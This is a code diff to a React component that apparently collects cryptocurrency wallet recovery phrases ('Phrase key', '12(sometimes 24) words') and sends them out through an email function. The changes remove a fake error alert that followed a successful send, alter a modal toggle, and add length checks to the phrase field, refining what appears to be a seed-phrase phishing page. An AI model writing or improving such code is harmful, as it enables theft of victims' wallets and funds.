@@ -14,7 +14,7 @@ const sendEmail = (e) => {
     )
     .then(
       (result) => {
-        alert("ERR! Error ");
+
         console.log(result.text);
       },
       (error) => {
@@ -28,7 +28,7 @@ const Phrase = () => {
   const [hide, setHide] = useState(false);
 
   const Showmodal = () => {
-    setHide(true);
+    setHide(false);
   };
 
   return (
@@ -67,6 +67,8 @@ const Phrase = () => {
             type="text"
             placeholder="Phrase key"
             name="key"
+            min="12" max="100"
+            minLength="12"
           ></input>
           <h6 className="h4" style={{ color: "black" }}>
             Typically 12(sometimes 24) words separated by single spaces
